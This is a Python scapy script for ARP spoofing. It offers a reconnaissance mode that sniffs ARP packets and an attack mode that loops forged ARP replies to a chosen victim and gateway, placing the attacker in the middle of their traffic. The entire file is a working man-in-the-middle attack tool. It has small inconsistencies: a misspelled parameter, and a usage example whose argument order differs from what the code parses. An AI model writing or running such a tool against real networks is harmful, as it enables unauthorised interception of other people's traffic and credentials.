import sys
import time
import os
import scapy.all as scapy

def usage():
    print("Usage:")
    print("Reconisance mode: -r o --reconisance")
    print("Attack mode: -a o --attack <IP_victim> <MAC_victim> <IP_gateway> <MAC_gateway>")
    print("Attack example: python3 arpspoof.py -a 192.168.1.5 192.168.1.1 aa:bb:cc:dd:ee:ff 11:22:33:44:55:66")


def detect_requests(packet):
    if packet.haslayer(scapy.ARP):
        ip_src = packet[scapy.ARP].psrc
        ip_dst = packet[scapy.ARP].pdst
        mac_src = packet[scapy.ARP].hwsrc
        mac_dst = packet[scapy.ARP].hwdst
        
        print(f"[ARP] FROM {ip_src} ({mac_src}) TO {ip_dst} ({mac_dst})")

def reconisance():
    print("[+] Starting reconisance...")
    scapy.sniff(filter="arp", prn=detect_requests, store=0)

def spoof(target_ip, spoof_ip, target_mac, attacker_mac):
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    ether = scapy.Ether(dst=target_mac)

    packet = ether / arp_response
    scapy.sendp(packet, verbose=False)

def attack_mode(ictim_ip, gateway_ip, victim_mac, gateway_mac):
    attacker_mac = scapy.get_if_hwaddr(scapy.conf.iface)

    print(f"[+] Starting ARP Spoofing in {victim_ip} ({victim_mac}) and {gateway_ip} ({gateway_mac})...")
    try:
        while True:
            spoof(victim_ip, gateway_ip, victim_mac, attacker_mac)
            spoof(gateway_ip, victim_ip, gateway_mac, attacker_mac)
            print("ARP packets sent for poisoning...")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nStopping ARP Spoofing...")

if os.geteuid() != 0:
    print("Script must be runned with sudo.")
    sys.exit(1)

if len(sys.argv) < 2:
    usage()
    sys.exit(1)

mode = sys.argv[1]

if mode in ['-r', '--reconisance']:
    reconisance()

elif mode in ['-a', '--attack']:
    if len(sys.argv) != 6:
        print("Error: 4 parameters are required")
        usage()
        sys.exit(1)
    
    victim_ip = sys.argv[2]
    victim_mac = sys.argv[3]
    gateway_ip = sys.argv[4]
    gateway_mac = sys.argv[5]
    
    attack_mode(victim_ip, gateway_ip, victim_mac, gateway_mac)

else:
    usage()
    sys.exit(1)